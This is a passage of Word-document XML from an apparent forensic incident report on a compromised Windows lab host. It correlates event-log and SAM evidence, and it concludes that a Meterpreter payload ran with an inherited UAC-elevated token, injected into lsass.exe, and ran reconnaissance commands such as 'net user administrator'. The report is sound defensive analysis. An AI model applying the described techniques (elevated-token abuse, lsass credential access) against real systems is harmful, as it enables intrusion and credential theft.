            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328 → 2023-11-10 11:13:35.806786</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Security 4624 2023-11-10 10:42:10.277 LogonType 2 medmondson LogonId 0x15347 (elevated half of the split token; filtered token 0x153A9) (row 26783). consent.exe (UAC) ran at 11:02:56.15 (Sysmon 1 row 18641), then powershell.exe PID 1088 started High IL with LogonId 0x15347 at 11:02:57 (row 18642). All attacker processes carry User=DESKTOP-KJ81A5A\medmondson, IntegrityLevel=High, LogonId=0x15347: C:\Payloads\pscp.exe 11:03:09 (18650), explorer.exe 7324 (18651), cmd.exe 11:04:13 / 11:09:06, tracert, quser, powershell, tasklist, netstat, whoami, net.exe/net1.exe 11:13:35 (18695/18696). No process of the chain runs as SYSTEM (no getsystem evidence in Sysmon 1), no 4703/4672 for a new privileged logon after 10:42:23. Security 4798 at 11:13:35.797 and 11:13:35.807 (rows 27065, 27066): local group membership of DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) enumerated, SubjectLogonId 0x15347, CallerProcessName C:\Windows\System32\net1.exe, CallerProcessId 0x480. The Administrator account is disabled (SAM) and was not modified afterwards (no 4722/4724/4738 after 2023-11-09).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The attacker did not need an escalation exploit: the payload was launched from the user's UAC-elevated PowerShell, so Meterpreter inherited a full administrator token (SeDebugPrivilege available), which explains the successful remote thread into lsass.exe at 11:03:56 (F-005) — likely credential-access attempt (hashdump/kiwi-type), not provable here (no Sysmon 10 detail on dumping output). The 4798 by net1.exe is an independent Security-log corroboration of the Sysmon-observed 'net user administrator' (F-007): reconnaissance of the built-in admin account, with no follow-up enabling or password reset.</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10:42:10.277482</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x15347 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26783</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:56.154634</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>consent.exe 6492 468 0000019A5C088A40</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2016, ProcessGUID: e6e9f951-0de0-654e-8701-000000000500 | RuleName: - | MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18641</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:57.767576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1088, ProcessGUID: e6e9f951-0de1-654e-8801-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18642</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</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11:13:35.786440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\net1  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1152, ProcessGUID: e6e9f951-105f-654e-cd01-000000000500 | RuleName: - | MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.796776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) | SubjectLogonId: 0x15347 | CallerProcessName: C:\Windows\System32\net1.exe | CallerProcessId: 0x480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27065</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.806786</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) | SubjectLogonId: 0x15347 | CallerProcessName: C:\Windows\System32\net1.exe | CallerProcessId: 0x480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27066</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Administrator RID=500 logons=0 groups=Administrators [disabled]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-011: Accounts and logons: only local interactive logons of medmondson; no account creation, group change or remote/explicit-credential logon attributable to the attacker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accounts (sam)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-terminalservices-localsessionmanager%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx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2023-11-09 11:02:46.526328 → 2023-11-10 10:42:23.563477</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Security.evtx (available 2023-11-09 11:02 → 2023-11-10 12:31 UTC): 4624 = 336 events, all LogonType 2 (interactive/local, RemoteHost 127.0.0.1 or '-') or 0/5 (SYSTEM/services). No LogonType 3/10, no 4625 in Security (the 5 '4625' rows are EventSystem/Application, unrelated), no 4740, no 4768/4769/4776, no RDP (RemoteConnectionManager 1149 / RDPClient 1024 absent; TS-LocalSessionManager 21/22/24/25 all 'LOCAL'). 4648 (26) are all svchost/winlogon/wininit/msoobe/CloudExperienceHostBroker to localhost (logon process behaviour). Account management (4720/4722/4724/4728/4732/4738) only during OOBE on 2023-11-09: defaultuser0 (RID 1000) created (row 25105), medmondson (RID 1001) created 11:08:58 by S-1-5-18 (row 25457), added to Users (25458) and Administrators (row 25467), password set (25462/25464); WDAGUtilityAccount (RID 504) created by MINWINPC$ (24958). No 47xx after 2023-11-09 11:09. SAM (recmd UserAccounts): Administrator(500)/Guest(501)/DefaultAccount(503)/WDAGUtilityAccount(504) disabled; medmondson(1001) created 2023-11-09 11:08:58, Administrators group, 7 logons, last logon 2023-11-10 10:42:23.548, last password change 2023-11-09 11:08:58, 0 invalid logons; defaultuser0(1000) disabled. medmondson interactive logons (4624 type 2, paired linked tokens = UAC split token): 2023-11-09 11:08:59, 11:09:53; 2023-11-10 10:08:24, 10:08:47, 10:15:45, 10:42:10 (LogonId 0x15347 elevated / 0x153A9 filtered, rows 26783/26784), 10:42:23 (0x57147/0x5716A). Note: OOBE events are logged at 2023-11-09 18:58–19:00 but have lower record numbers than the 11:02 events: the clock was ~8 h ahead (Pacific bias 480) before being corrected during setup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>All account activity is consistent with the Windows installation/OOBE and lab setup by the legitimate user medmondson; the compromise used the already-logged-on admin session (no lateral movement, no brute force, no new/backdoor account, no privilege group modification). Absence of network logons is meaningful since the Security log covers the full lifetime of the machine (installed 2023-11-09). The apparent 18:58/19:00 timestamps on 2023-11-09 are a setup-time clock offset, not attacker activity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (9)</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2023-11-09 11:08:58.475556</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25457</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.563802</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Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x3E7 | MemberName: - | MemberSid: S-1-5-21-1841083384-974204330-411256071-1001 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25467</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:23.823486</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-KJ81A5A\defaultuser0 (S-1-5-21-1841083384-974204330-411256071-1000)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.277482</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x15347 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26783</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.277511</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x153A9 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26784</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:23.563477</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x57147 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26863</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:58.466478</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>medmondson RID=1001 logons=7 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Administrator RID=500 logons=0 groups=Administrators [disabled]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_UserAccounts.csv#1</w:t>
            </w:r>
          </w:p>
